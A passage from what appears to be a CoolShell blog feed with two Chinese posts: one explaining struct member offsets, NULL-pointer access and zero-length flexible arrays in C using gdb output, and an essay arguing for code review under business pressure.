<p>你编译一下上面的代码，在VC++和GCC下都会在14行的printf处crash掉你的程序。<a title="Laruence" href="https://weibo.com/laruence" target="_blank">@Laruence</a> 说这个是个经典的坑，我觉得这怎么会是经典的坑呢？上面这代码，你一定会问，为什么if语句判断的不是f.a？而是f.a里面的数组？写这样代码的人脑子里在想什么？还是用这样的代码来玩票？不管怎么样，看过原微博的回复，我个人觉得大家主要还是对C语言理解不深，如果这算坑的话，那么全都是坑。</p>
<p><span id="more-11377"></span></p>
<p>接下来，你调试一下，或是你把14行的printf语句改成：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">printf("%x\n", f.a-&gt;s);</code></p>
<p>你会看到程序不crash了。程序输出：4。 这下你知道了，访问0x4的内存地址，不crash才怪。于是，你一定会有如下的问题：</p>
<p style="padding-left: 30px;"><strong>1）为什么不是 13行if语句出错？f.a被初始化为空了嘛，用空指针访问成员变量为什么不crash？</strong></p>
<p style="padding-left: 30px;"><strong>2）为什么会访问到了0x4的地址？靠，4是怎么出来的？</strong></p>
<p style="padding-left: 30px;"><strong>3）代码中的第4行，char s[0] 是个什么东西？零长度的数组？为什么要这样玩？</strong></p>
<p>让我们从基础开始一点一点地来解释C语言中这些诡异的问题。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%AD%E7%9A%84%E6%88%90%E5%91%98" title="结构体中的成员">结构体中的成员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%8C%87%E9%92%88%E5%92%8C%E6%95%B0%E7%BB%84%E7%9A%84%E5%B7%AE%E5%88%AB" title="指针和数组的差别">指针和数组的差别</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%85%B3%E4%BA%8E%E9%9B%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E6%95%B0%E7%BB%84" title="关于零长度的数组">关于零长度的数组</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%90%8E%E8%AE%B0" title="后记">后记</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E6%9E%84%E4%BD%93%E4%B8%AD%E7%9A%84%E6%88%90%E5%91%98"></span>结构体中的成员<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们需要知道——<strong>所谓变量，其实是内存地址的一个抽像名字罢了</strong>。在静态编译的程序中，所有的变量名都会在编译时被转成内存地址。机器是不知道我们取的名字的，只知道地址。</p>
<p>所以有了——栈内存区，堆内存区，静态内存区，常量内存区，我们代码中的所有变量都会被编译器预先放到这些内存区中。</p>
<p>有了上面这个基础，我们来看一下结构体中的成员的地址是什么？我们先简单化一下代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct test{
    int i;
    char *p;
};</pre>
<p>上面代码中，test结构中i和p指针，在C的编译器中保存的是相对地址——也就是说，他们的地址是相对于struct test的实例的。如果我们有这样的代码：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">struct test t;</code></p>
<p>我们用gdb跟进去，对于实例t，我们可以看到：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># t实例中的p就是一个野指针
(gdb) p t
$1 = {i = 0, c = 0 '\000', d = 0 '\000', p = 0x4003e0 "1\355I\211\..."}

# 输出t的地址
(gdb) p &amp;t
$2 = (struct test *) 0x7fffffffe5f0

#输出(t.i)的地址
(gdb) p &amp;(t.i)
$3 = (char **) 0x7fffffffe5f0

#输出(t.p)的地址
(gdb) p &amp;(t.p)
$4 = (char **) 0x7fffffffe5f4</pre>
<p>我们可以看到，t.i的地址和t的地址是一样的，t.p的址址相对于t的地址多了个4。说白了，<strong>t.i 其实就是(&amp;t + 0x0)</strong>, <strong>t.p 的其实就是 (&amp;t + 0x4)</strong>。0x0和0x4这个偏移地址就是成员i和p在编译时就被编译器给hard code了的地址。于是，你就知道，<strong>不管结构体的实例是什么——访问其成员其实就是加成员的偏移量</strong>。</p>
<p>下面我们来做个实验：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct test{
    int i;
    short c;
    char *p;
};

int main(){
    struct test *pt=NULL;
    return 0;
}</pre>
<p>编译后，我们用gdb调试一下，当初始化pt后，我们看看如下的调试：（我们可以看到就算是pt为NULL，访问其中的成员时，其实就是在访问相对于pt的内址）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) p pt
$1 = (struct test *) 0x0
(gdb) p pt-&gt;i
Cannot access memory at address 0x0
(gdb) p pt-&gt;c
Cannot access memory at address 0x4
(gdb) p pt-&gt;p
Cannot access memory at address 0x8</pre>
<p>注意：上面的pt-&gt;p的偏移之所以是0x8而不是0x6，是因为内存对齐了（我在64位系统上）。关于内存对齐，可参看《<a title="深入理解C语言" href="https://coolshell.cn/articles/5761.html" target="_blank" rel="bookmark">深入理解C语言</a>》一文。</p>
<p>好了，现在你知道为什么原题中会访问到了0x4的地址了吧，因为是相对地址。</p>
<p>相对地址有很好多处，其可以玩出一些有意思的编程技巧，比如把C搞出面向对象式的感觉来，你可以参看我正好11年前的文章《<a href="http://blog.csdn.net/haoel/article/details/2864" target="_blank">用C写面向对像的程序</a>》（用指针类型强转的危险玩法——相对于C++来说，C++编译器帮你管了继承和虚函数表，语义也清楚了很多）</p>
<h4>
<span class="ez-toc-section" id="%E6%8C%87%E9%92%88%E5%92%8C%E6%95%B0%E7%BB%84%E7%9A%84%E5%B7%AE%E5%88%AB"></span>指针和数组的差别<span class="ez-toc-section-end"></span>
</h4>
<p>有了上面的基础后，你把源代码中的struct str结构体中的char s[0];改成char *s;试试看，你会发现，在13行if条件的时候，程序因为Cannot access memory就直接挂掉了。为什么声明成char s[0]，程序会在14行挂掉，而声明成char *s，程序会在13行挂掉呢？<strong>那么char *s 和 char s[0]有什么差别呢</strong>？</p>
<p>在说明这个事之前，有必要看一下汇编代码，用GDB查看后发现：</p>
<ul>
<li>对于char s[0]来说，汇编代码用了lea指令，lea   0x04(%rax),   %rdx</li>
<li>对于char*s来说，汇编代码用了mov指令，mov 0x04(%rax),   %rdx</li>
</ul>
<p>lea全称load effective address，是把地址放进去，而mov则是把地址里的内容放进去。所以，就crash了。</p>
<p>从这里，我们可以看到，<strong>访问成员数组名其实得到的是数组的相对地址，而访问成员指针其实是相对地址里的内容</strong>（这和访问其它非指针或数组的变量是一样的）</p>
<p>换句话说，<strong>对于数组 char s[10]来说，数组名 s 和 &amp;s 都是一样的</strong>（不信你可以自己写个程序试试）。在我们这个例子中，也就是说，都表示了偏移后的地址。这样，如果我们访问 指针的地址（或是成员变量的地址），那么也就不会让程序挂掉了。</p>
<p>正如下面的代码，可以运行一点也不会crash掉（你汇编一下你会看到用的都是lea指令）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct test{
    int i;
    short c;
    char *p;
    char s[10];
};

int main(){
    struct test *pt=NULL;
    printf("&amp;s = %x\n", pt-&gt;s); //等价于 printf("%x\n", &amp;(pt-&gt;s) );
    printf("&amp;i = %x\n", &amp;pt-&gt;i); //因为操作符优先级，我没有写成&amp;(pt-&gt;i)
    printf("&amp;c = %x\n", &amp;pt-&gt;c);
    printf("&amp;p = %x\n", &amp;pt-&gt;p);
    return 0;
}</pre>
<p><strong>看到这里，你觉得这能算坑吗？不要出什么事都去怪语言，大家要想想是不是问题出在自己身上。</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E9%9B%B6%E9%95%BF%E5%BA%A6%E7%9A%84%E6%95%B0%E7%BB%84"></span>关于零长度的数组<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们要知道，<strong>0长度的数组在ISO C和C++的规格说明书中是不允许的</strong>。这也就是为什么在VC++2012下编译你会得到一个警告：“arning C4200: 使用了非标准扩展 : 结构/联合中的零大小数组”。</p>
<p>那么为什么gcc可以通过而连一个警告都没有？那是因为gcc 为了预先支持C99的这种玩法，所以，让“零长度数组”这种玩法合法了。关于GCC对于这个事的文档在这里：“<a title="Arrays of Length Zero" href="https://gcc.gnu.org/onlinedocs/gcc/Zero-Length.html" target="_blank">Arrays of Length Zero</a>”，文档中给了一个例子（我改了一下，改成可以运行的了）：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

struct line {
   int length;
   char contents[0]; // C99的玩法是：char contents[]; 没有指定数组长度
};

int main(){
    int this_length=10;
    struct line *thisline = (struct line *)
                     malloc (sizeof (struct line) + this_length);
    thisline-&gt;length = this_length;
    memset(thisline-&gt;contents, 'a', this_length);
    return 0;
}</pre>
<p>上面这段代码的意思是：我想分配一个不定长的数组，于是我有一个结构体，其中有两个成员，一个是length，代表数组的长度，一个是contents，代码数组的内容。后面代码里的 this_length（长度是10）代表是我想分配的数据的长度。（这看上去是不是像一个C++的类？）这种玩法英文叫：Flexible Array，中文翻译叫：柔性数组。</p>
<p>我们来用gdb看一下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) p thisline
$1 = (struct line *) 0x601010

(gdb) p *thisline
$2 = {length = 10, contents = 0x601010 "\n"}

(gdb) p thisline-&gt;contents
$3 = 0x601014 "aaaaaaaaaa"</pre>
<p>我们可以看到：在输出*thisline时，我们发现其中的成员变量contents的地址居然和thisline是一样的（偏移量为0x0??!!）。但是当我们输出thisline-&gt;contents的时候，你又发现contents的地址是被offset了0x4了的，内容也变成了10个‘a’。（我觉得这是一个GDB的bug，VC++的调试器就能很好的显示）</p>
<p>我们继续，如果你sizeof(char[0])或是 sizeof(int[0]) 之类的零长度数组，你会发现sizeof返回了0，这就是说，零长度的数组是存在于结构体内的，但是不占结构体的size。你可以简单的理解为一个没有内容的占位标识，直到我们给结构体分配了内存，这个占位标识才变成了一个有长度的数组。</p>
<p>看到这里，你会说，为什么要这样搞啊，把contents声明成一个指针，然后为它再分配一下内存不行么？就像下面一样。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW" data-enlighter-highlight="3,9">struct line {
   int length;
   char *contents;
};

int main(){
    int this_length=10;
    struct line *thisline = (struct line *)malloc (sizeof (struct line));
    thisline-&gt;contents = (char*) malloc( sizeof(char) * this_length );
    thisline-&gt;length = this_length;
    memset(thisline-&gt;contents, 'a', this_length);
    return 0;
}</pre>
<p>这不一样清楚吗？而且也没什么怪异难懂的东西。是的，这也是普遍的编程方式，代码是很清晰，也让人很容易理解。即然这样，那为什么要搞一个零长度的数组？有毛意义？！</p>
<p>这个事情出来的原因是——<strong>我们想给一个结构体内的数据分配一个连续的内存！</strong>这样做的意义有两个好处：</p>
<p style="padding-left: 30px;"><strong>第一个意义是，方便内存释放</strong>。如果我们的代码是在一个给别人用的函数中，你在里面做了二次内存分配，并把整个结构体返回给用户。用户调用free可以释放结构体，但是用户并不知道这个结构体内的成员也需要free，所以你不能指望用户来发现这个事。所以，如果我们把结构体的内存以及其成员要的内存一次性分配好了，并返回给用户一个结构体指针，用户做一次free就可以把所有的内存也给释放掉。（读到这里，你一定会觉得C++的封闭中的析构函数会让这事容易和干净很多）</p>
<p style="padding-left: 30px;"><strong>第二个原因是，这样有利于访问速度</strong>。连续的内存有益于提高访问速度，也有益于减少内存碎片。（其实，我个人觉得也没多高了，反正你跑不了要用做偏移量的加法来寻址）</p>
<p>我们来看看是怎么个连续的，用gdb的x命令来查看：(我们知道，用struct line {}中的那个char contents[]不占用结构体的内存，所以，struct line就只有一个int成员，4个字节，而我们还要为contents[]分配10个字节长度，所以，一共是14个字节)</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) x /14b thisline
0x601010:       10      0       0       0       97      97      97      97
0x601018:       97      97      97      97      97      97</pre>
<p>从上面的内存布局我们可以看到，前4个字节是 int length，后10个字节就是char contents[]。</p>
<p>如果用指针的话，会变成这个样子：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(gdb) x /16b thisline
0x601010:       1       0       0       0       0       0       0       0
0x601018:       32      16      96      0       0       0       0       0
(gdb) x /10b this-&gt;contents
0x601020:       97      97      97      97      97      97      97      97
0x601028:       97      97</pre>
<p>上面一共输出了四行内存，其中，</p>
<ul>
<li>第一行前四个字节是 int length，第一行的后四个字节是对齐。</li>
<li>第二行是char* contents，64位系统指针8个长度，他的值是0x20 0x10 0x60 也就是0x601020。</li>
<li>第三行和第四行是char* contents指向的内容。</li>
</ul>
<p>从这里，我们看到，<strong>其中的差别——数组的原地就是内容，而指针的那里保存的是内容的地址</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E8%AE%B0"></span>后记<span class="ez-toc-section-end"></span>
</h4>
<p>好了，我的文章到这里就结束了。但是，请允许我再唠叨两句。</p>
<p style="padding-left: 30px;"><strong>1）看过这篇文章，你觉得C复杂吗？我觉得并不简单。某些地方的复杂程度不亚于C++。</strong></p>
<p style="padding-left: 30px;"><strong>2）那些学不好C++的人一定是连C都学不好的人。连C都没学好，你们根本没有资格鄙视C++。</strong></p>
<p style="padding-left: 30px;"><strong>3）当你们在说有坑的时候，你得问一下自己，是真有坑还是自己的学习能力上出了问题。</strong></p>
<p>如果你觉得你的C语言还不错，欢迎你看看《<a title="C语言的谜题" href="https://coolshell.cn/articles/945.html" target="_blank">C语言的谜题</a>》还有《<a title="谁说C语言很简单？" href="https://coolshell.cn/articles/873.html" target="_blank">谁说C语言很简单？</a>》还有《<a href="https://coolshell.cn/articles/830.html" target="_blank">语言的歧义</a>》以及《<a title="深入理解C语言" href="https://coolshell.cn/articles/5761.html" target="_blank" rel="bookmark">深入理解C语言</a>》一文。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-04-01T08:17:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/11377.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从Code Review 谈如何做技术 ]]></title>
<link>https://coolshell.cn/articles/11432.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >（这篇文章缘由我的微博，我想多说一些，有些杂乱，想到哪写到哪）</p>
<p>这两天，在微博上表达了一下Code Review的重要性。因为翻看了阿里内部的Review Board上的记录，从上面发现Code Review做得好的是一些比较偏技术的团队，而偏业务的技术团队基本上没有看到Code Review的记录。当然，这并不能说没有记录他们就没有做Code Review，于是，我就问了一下以前在业务团队做过的同事有没有Code Review，他告诉我不但没有Code Review，而且他认为Code Review没用，因为：</p>
<p style="padding-left: 30px;">1）工期压得太紧，时间连coding都不够，以上线为目的，</p>
<p style="padding-left: 30px;">2）需求老变，代码的生命周期太短。所以，写好的代码没有任何意义，烂就烂吧，反正与绩效无关。</p>
<p>我心里非常不认同这样的观点，我觉得我是程序员，我是工程师，就像医生一样，不是把病人医好就好了，还要对病人的长期健康负责。对于常见病，要很快地医好病人很简单，下猛药，大量使用抗生素，好得飞快。但大家都知道，这明显是“饮鸩止渴”、“竭泽而渔”的做法。医生需要有责任心和医德，我也觉得程序员工程师也要有相应的责任心和相应的修养。东西交给我我必需要负责，我觉得这种负责和修养不是”做出来“就了事了，而是要到“做漂亮”这个级别，这就是“山寨”和“工业”的差别。而只以“做出来”为目的标准，我只能以为，这样的做法只不过是“按部就班”的堆砌代码罢了，和劳动密集型的“装配生产线”和“砌砖头”没有什么差别，在这种环境里呆着还不如离开。</p>
<p>老实说，因为去年我在业务团队的时候，我的团队也没有做Code Review，原因是多样的。其中一个重要原因是，我刚来阿里，所以，需要做的是在适应阿里的文化，任何公司都有自己的风格和特点，任何公司的做法都有他的理由和成因，对于我这样的一个初来者，首要的是要适应和观察，不要对团队做太多的改动，跟从、理解和信任是融入的关键。（注：在建北京团队和不要专职的测试人员上我都受到了一些阻力），所以跟着团队走没有玩Code Review。干了一年后，觉得我妥协了很多我以前所坚持的东西，觉得自己的标准在降低，想一想后背拔凉拔凉的，所以我决定坚持，而且还要坚持高标准。</p>
<p><span id="more-11432"></span></p>
<p>对于Code Review很重要的这个观点，在微博上抛出来后，被一些阿里的工程师，架构师/专家，甚至资深架构师批评，我在和他们回复和讨论的过程中，居然发现有个“因为对方用户的设置”我无法回复了（我被拉黑了，还有一些直接就是冷讽和骂人了，微博中我就直接删除了）。这些批评我的阿里工程师/架构师的观点总结一下如下：（<strong>顺便说一下，阿里内还是有很多团队坚持做Code Review的</strong>）</p>
<p style="padding-left: 30px;">1）到业务团队体会一下，倒逼工期的项目有多少？订好交付日期后再要求提前1个月的有多少？现在是做到已经不容易，更不谈做得漂亮！。</p>
<p style="padding-left: 30px;">2）Code Review是一种教条，意义不大，有测试，只要不出错，就可以了。</p>
<p style="padding-left: 30px;">3）目标都是改进质量，有限的投入总希望能有最大的产出，不同沉湎改进质量的方式不一样，业务应用开发忙的跟狗一样，而且业务逻辑变化快，通用性差，codereviw的成本要比底层高。</p>
<p style="padding-left: 30px;"><span style="line-height: 1.5em;">4）现在的主要矛盾是倒排出来的工期和不靠谱的程序员之间的矛盾，我认为cr不是解决这个问题的银弹。不从实际情况出发光打正义的嘴炮实在太过于自慰了 。</span></p>
<p><strong>我们可以看到，上面观点其实和Code Review没有太多关系，其实是在抱怨另外的问题</strong>。这些观点其实是技术团队和业务团队的矛盾，但不知道为什么强加给了我的“Code Review很重要”的这个观点，然后这些观点反过来冲击“Code Reivew”，并说“Code Review无用”。这种讨论问题的方式在很常见，你说A，我说B，本来A、B是两件事，但就是要混为一谈，然后似是而非的用B来证明你的A观点是错的。（也许，这些工程师/架构师心存怨气，需要一个发泄的通道）</p>
<p><strong>我觉得，很多时候，人思考问题思考不清楚，很大一部分原因是因为把很多问题混为一谈</strong>，连我自己有些时候都会这样。引以为戒。</p>
<p>即然被混为一谈，那我就来拆分一下，也是下面这三个问题：</p>
<ul>
<li>Code Review有没有用的问题。</li>
<li>Code Review做不起来的问题。</li>
<li>业务变化快，速度快的问题，技术疲于跟命。</li>
</ul>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Code_Review" title="Code Review">Code Review</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Code_Review_%E7%9A%84%E9%97%AE%E9%A2%98" title="Code Review 的问题">Code Review 的问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%A2%AB%E4%B8%9A%E5%8A%A1%E9%80%BC%E5%BE%97%E5%A4%AA%E7%B4%A7" title="被业务逼得太紧">被业务逼得太紧</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Code_Review"></span>Code Review<span class="ez-toc-section-end"></span>
</h4>
<p>你Google一下Code Reivew这个关键词，你就会发现Code Review的好处基本上是不存在争议的，有很多很多的文章和博文都在说Code Review的重要性，怎么做会更好，而且很多公司在面试过程中会加入“Code Review”的问题。打开<a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5" target="_blank">Wikipedia的词条</a>你会看到这样的描述——</p>
<blockquote>
<p>卡珀斯·琼斯（Capers Jones）分析了超过12,000个软件开发项目，其中使用正式代码审查的项目，发现潜在缺陷率约在60-65%之间，若是非正式的代码审查，发现潜在缺陷率不到50%。大部份的测试，发现的潜在缺陷率会在30%左右。</p>
<p>对于一些关键的软件（例如安全关键系统的嵌入式软件），一般的代码审查速度约是一小时150行程序码，一小时审查数百行程序码的审查速度太快，可能无法找到程序中的问题。代码审查一般可以找到及移除约65%的错误，最高可以到85%。</p>
<p>也有研究针对代码审查找到的缺陷类型进行分析。代码审查找到的缺陷中，有75%是和计算机安全隐患有关。对于产品生命周期很长的软件公司而言，代码审查是很有效的工具。</p>
</blockquote>
<p><strong>Code Review的好处我觉得不用多说了，主要是让你的代码可以更好的组织起来，有更易读，有更高的维护性，同时可以达到知识共享，找到bug只是其中的副产品</strong>。这个东西已经不新鲜了，你上网可以找到很多文章，我就不多说了。就像你写程序要判断错误一样，Code Review也是最基本的常识性的东西。</p>
<p>我从2002年开始就浸泡在严格的Code Review中，我的个人成长和Code Review有很大的关系，如果我的成长过程中没有经历过Code Review这个事，我完全不敢想像。</p>
<p><strong>我个人认为代码有这几种级别：1）可编译，2）可运行，3）可测试，4）可读，5）可维护，6）可重用。通过自动化测试的代码只能达到第3）级，而通过Code Review的代码少会在第4）级甚至更高。</strong>关于Code Review，你可以参看本站的《<a title="Code Review中的几个提示" href="https://coolshell.cn/articles/1302.html" target="_blank">Code Review中的几个提示</a>》</p>
<p>可见，Code Review直接关系到了你的工程能力！</p>
<h4>
<span class="ez-toc-section" id="Code_Review_%E7%9A%84%E9%97%AE%E9%A2%98"></span>Code Review 的问题<span class="ez-toc-section-end"></span>
</h4>
<p>有下面几个情况会让你的Code Review没有效果。</p>
<p>首当其冲的是——“<strong>人员能力不足</strong>”，我经历过这样的情况，Code Review的过程中，大家大眼瞪小眼，没有什么好的想法，不知道什么是好的代码，什么是不好的代码。导致Code Review大多数都在代码风格上。今天，我告诉你，代码风格这种事，是每个程序员自查的事情，不应该浪费大家的时间。对此，我有两个建议：1）你团队的人招错了，该换血了。2）让你团队的人花时候阅读一下《<a href="https://book.douban.com/subject/1477390/" target="_blank">代码大全</a>》这本书（当然，还要读很多基础知识的书）。</p>
<p>次当其冲的是——“<strong>结果更重要</strong>”，也就是说，做出来更重要，做漂亮不重要。因为我的KPI和年终奖based on how many works I’ve done！而不是How perfect they are ! 这让我想到那些天天在用Spring MVC 做CRUD网页的工程师，我承认，他们很熟练。大量的重复劳动。其实，仔细想一下好多东西是可以框架化，模板化，或是自动生成的。所以，为了堆出这么多网页就停地去堆，做的东西是很多，但是没有任何成长。急功近利，也许，你做得多，拿到了不错的年终奖，但是你失去的也多，失去了成为一个卓越工程师的机会。你本来可以让你的月薪在1-2年后翻1-2倍的，但一年后你只拿到了为数不多的年终奖。</p>
<p>然后是——“<strong>人员的态度问题</strong>”，一方面就是懒，不想精益求精，只要干完活交差了事。对此，你更要大力开展Code Review了，让这种人写出来的代码曝光在更多人面前，让他为质量不好的代码蒙羞。另一方面，有人会觉得那是别人的模块，我不懂，也没时间 去懂，不懂他的业务怎么做Code Review? 我只想说，如果你的团队里这样的“各个自扫门前雪”的事越多，那么这个团队也就越没主动性，没有主动性也就越不可能是个好团队，做的东西也不可能好。而对于个人来说，也就越不可能有成长。</p>
<p>接下来是——“<strong>需求变化的问题</strong>”，有人认识，需求变得快，代码的生存周期比较短，不需要好的代码，反正过两天这些代码就会被废弃了。如果是一次性的东西，的确质量不需要太高，反正用了就扔。但是，我觉得多多少少要Review一下这个一次性的烂代码不会影响那些长期在用的代码吧，如果你的项目全部都是临时代码，那么你团队是不是也是一个临时团队？关于如果应对需求变化，你可以看看本站的《<a href="https://coolshell.cn/articles/6950.html" rel="bookmark">需求变化与IoC</a>》《<a href="https://coolshell.cn/articles/7236.html" target="_blank">Unix的设计思想来应对多变的需求</a>》的文章 ，从这些文章中，我相信你可以看到对于需求变化的代码质量需要的更高。</p>
<p>最后是——“<strong>时间不够问题</strong>”，如果是业务逼得紧，让你疲于奔命，那么这不是Code Review好不好问题，这是需求管理和项目管理的问题以及别的非技术的问题。下面我会说。</p>
<p>不管怎么样，上述Code Review的问题不应该成为“Code Review无意义”的理由或借口，这就好像“因噎废食”一样。干什么事都会有困难和问题的，有的人就这样退缩了，但有的人看得到利大于弊，还是去坚持，人与人的不同正在这个地方。这就是为什么运动会受伤，但还是会人去运动，而有人因为怕受伤就退缩了一样。</p>
<h4>
<span class="ez-toc-section" id="%E8%A2%AB%E4%B8%9A%E5%8A%A1%E9%80%BC%E5%BE%97%E5%A4%AA%E7%B4%A7"></span>被业务逼得太紧<span class="ez-toc-section-end"></span>
</h4>
<p>被业务逼得太紧，需求乱变，这其实和Code Review没有多大关系了。对此，我想先讲一个我的故事。</p>
<p>我去年在阿里的聚石塔，刚去的时候，聚石塔正在做一个很大的重构——对架构的大调整。因此压了很多业务需求，等这个项目花了2-3个月做完了后，一下子涌入了30-50个需求，还规定一个月完成，搞得团队疲于奔命。在累了两周后，我仔细分析了一下这些需求，发现很多需求是在重复做阿里云已经做过的东西，还有一些需求是因为聚石塔这个平台不规范没有标准所产生的问题。于是，我做了这么三件事：</p>
<p style="padding-left: 30px;">1）重新定义聚石塔这个产品主要目标和范围，确定哪些该做，哪些不该做。</p>
<p style="padding-left: 30px;">2）为聚石塔制定标准 ，让阿里云的API都长得基本一样，并制订云资源的接入标准。</p>
<p style="padding-left: 30px;">3）推动重构阿里云的Portal系统，不再实现阿里云已经做过的东西，与阿里云紧密结合。</p>
<p>这些事情推动起来并不容易，聚石塔的业务方一开始也不理解，我和产品一起做业务方的工作，而阿里云也被我逼得很惨（在这里一并感谢，尤其阿里云的同学，老实说，和阿里云跨团队合作中是我这么多年来感觉最好的一次，相当赞）。通过这个事，聚石塔需求一下就有质的下降了。搞得还有几个工程师来和我说，你这么搞，聚石塔就没事可干了。姑且不说工程师对聚石塔的理解是怎么样的。 我只想说，我大量地减少了需求，尽最大可能联合了该联合的人，而不是自己闭门造车，并让产品的目标和方向更明确了。做了这些事情后，大家不但不用加班，而且还有时间充电去学技术，并为聚石塔思考未来的方向和发展。去年公司996的时候，我的团队还在965（搞得跟异教徒似的），而且还有很多时间去专研新的东西。</p>
<p>说这个故事，我不是为了得瑟，而是因为有些人在微博上抨击我是一个道貌岸然的只会谈概念讲道理的装逼犯。所以，我告诉大家我在聚石塔是怎么做的，我公开写在这里，你也可以向相关的同学去求证我说的是不是真的。也向你证明，我可能是个装逼犯，但绝不是只会谈概念讲道理的装逼犯。</p>
<p>被业务方逼得紧不要抱怨，你没有时间被逼得像牲口一样工作，这个时候，你需要的是暂停一下想一想，为什么会像牲口一样？而这正是让你变得聪明的机会。</p>
<p>我为你总结一下，</p>
<p style="padding-left: 30px;">1）你有没有去Review业务部门给你的这么多的需求，哪些是合理的，哪些是不合理的。在Amazon，开发工程师都会被教育拿到需求后一定要问——“为什么要做？业务影响度有多大？有多少用户受益？”，回答不清这个问题，没有数据的支持，就不做。所以，产品经理要做很多数据挖拙和用户调研的工作，而不是拍拍脑袋，听极少数的用户抱怨就要开需求了。</p>
<p style="padding-left: 30px;">2）产品经理也要管理和教育的。你要告诉你的产品经理：“你是一个好的产品经理，因为你不但对用户把握得很好，也会对软件工艺把握得很好。你不但会开出外在的功能性需求，也同样会开出内在的让软件系统更完善的非功能性需求。你不是在迁就用户，而是引导用户。你不会无限制地加功能，而是把握产品灵魂控制并简化功能。你会为自己要做的和不做东西的感到同样的自豪。”你要告诉你的产品经理：“做一个半成品不如做好半年产品”（更多这样的观点请参看《<a title="《Rework》摘录及感想" href="https://coolshell.cn/articles/9156.html" target="_blank">Rework摘录和感想</a>》）</p>
<p style="padding-left: 30px;">3）做事情是要讲效率的。Amazon里喜欢使用一种叫T-Shirt Size Estimation的评估方法来优先做投入小产出大的“Happy Case”。关于什么是效率，什么是T-Shirt Size Estimation，你可以看看《<a title="加班与效率" href="https://coolshell.cn/articles/10217.html" target="_blank">加班与效率</a>》一文 。</p>
<p style="padding-left: 30px;">4）需求总是会变化的，不要抱怨需求变化太快。你应该抱怨的是为什么我们没有把握好方向？老变？这个事就像踢足球一样，你要去的地方是球将要去的地方，而不是球现在的地方。你要知道球要去哪里，你就知道球之前是怎么动的，找到了运动轨迹后，你才知道球要去像何方。如果你都不知道球要去向何方，那你就是一只无头苍蝇一样，东一下西一下。</p>
<p><strong>当你忙得跟牲口一样，你应该停下来，问一下自己，自己成为牲口的原因，是不是就是因为自己做事时候像就牲口一样思考？</strong></p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>最后，我在给阿里今年新入职的毕业生的“技塑人生”的分享中，我给他们布置了5、6个Homework，分享几个给大家：</p>
<p style="padding-left: 30px;">1）重构或写一个模块，把他做成真正的Elegant级别。</p>
<p style="padding-left: 30px;">2）与大家分享一篇或几篇技术文章 ，并收获10-30个赞。</p>
<p style="padding-left: 30px;">3）降低现有至少20%的重复工作或维护工作</p>
<p style="padding-left: 30px;">4）拒绝或简化一个需求（需要项目中所有的Stakeholders都同意）</p>
<p>部署这些作业的原因，是我希望新入行的同学们对自己的工作坚持高的标准，我知道你们会因为骨感的现实而妥协，但是我希望你们就算在现实中妥协了也要在内心中坚持尽可能高的标准，不要习惯成自然，最后被社会这个大染缸给潜移默化了。因为你至少要对自己负责。<strong>对自己负责就是，用脚投票，如果妥协得受不了了就离开吧</strong>。</p>
